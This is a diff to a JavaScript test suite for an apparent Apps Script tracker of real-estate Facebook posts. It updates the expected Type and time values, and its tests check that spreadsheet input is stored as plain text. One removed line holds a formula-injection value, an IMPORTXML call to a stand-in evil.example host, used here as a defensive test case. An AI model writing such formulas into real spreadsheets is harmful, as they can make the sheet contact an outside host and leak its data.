@@ -20,9 +20,11 @@ describe('logPost replies with the row it wrote', () => {
       status: 'Posted',
       date: '2026-03-09',
       time: '14:30',
+      type: 'Condo / House and Lot',
       postedBy: 'Jan Dela Cruz',
     });
-    expect(w.posts.row(2).slice(0, 4)).toEqual(['2026-03-09', 'Casa Amara', 'Group post', '14:30']);
+    // An existing tab with the old headers: Date, Title, Type, Time. The time as the interns' sheet writes it.
+    expect(w.posts.row(2).slice(0, 4)).toEqual(['2026-03-09', 'Casa Amara', 'Condo / House and Lot', '2:30 PM']);
   });
 
   it('on Manila\'s calendar just after midnight, while UTC is still on the day before', () => {
@@ -56,7 +58,7 @@ describe('what is written is plain text (D7, bug 2)', () => {
 
     // No '#': every cell holds exactly the text written.
     expect(w.posts.row(2)).toEqual([
-      '2026-03-09', 'Casa Amara', 'Group post', '14:30', 'Posted', 'APG Main', LINK, 'Jan Dela Cruz', CASA.id, '',
+      '2026-03-09', 'Casa Amara', 'Condo / House and Lot', '2:30 PM', 'Posted', 'APG Main', LINK, 'Jan Dela Cruz', CASA.id, '',
     ]);
     // Only the cells it fills. Notes, which Code.gs does not know, keeps the tracker's own format.
     expect(w.posts.formats(2)).toEqual(['@', '@', '@', '@', '@', '@', '@', '@', '@', '']);
@@ -71,8 +73,9 @@ describe('what is written is plain text (D7, bug 2)', () => {
       postedBy: '=Jan',
     });
 
+    // The type comes from the Directory, not the request; the rest is written exactly.
     expect(w.posts.row(2)).toEqual([
-      '2026-03-09', 'Casa Amara', '=IMPORTXML("https://evil.example", "//a")', '10:00', 'Posted', 'APG Main',
+      '2026-03-09', 'Casa Amara', 'Condo / House and Lot', '10:00 AM', 'Posted', 'APG Main',
       'https://www.facebook.com/groups/apg/posts/+639171234567/', '=Jan', CASA.id, '',
     ]);
   });
@@ -102,7 +105,7 @@ describe('what is written is plain text (D7, bug 2)', () => {
 
     expect(w.logPost('jan', CASA)).toMatchObject({ ok: true });
     expect(full.maxRows).toBe(3);
-    expect(full.row(3)).toEqual(['2026-03-09', 'Casa Amara', '10:00', 'Posted', LINK, 'Jan Dela Cruz']);
+    expect(full.row(3)).toEqual(['2026-03-09', 'Casa Amara', '10:00 AM', 'Posted', LINK, 'Jan Dela Cruz']);
   });
 });
 
@@ -127,7 +130,7 @@ describe('columns are found by header in each tab', () => {
     w.posts.typeAt(1, 2, 'Type').typeAt(1, 3, 'Title');
     w.call('jan', 'logPost', { property: TOWER.name, propertyId: TOWER.id, fbAccount: 'APG Main', postLink: LINK, status: 'Pending' });
 
-    expect(w.posts.row(3).slice(0, 3)).toEqual(['2026-03-09', 'Group post', '1201']);
+    expect(w.posts.row(3).slice(0, 3)).toEqual(['2026-03-09', 'Office Space', '1201']);
   });
 });
 
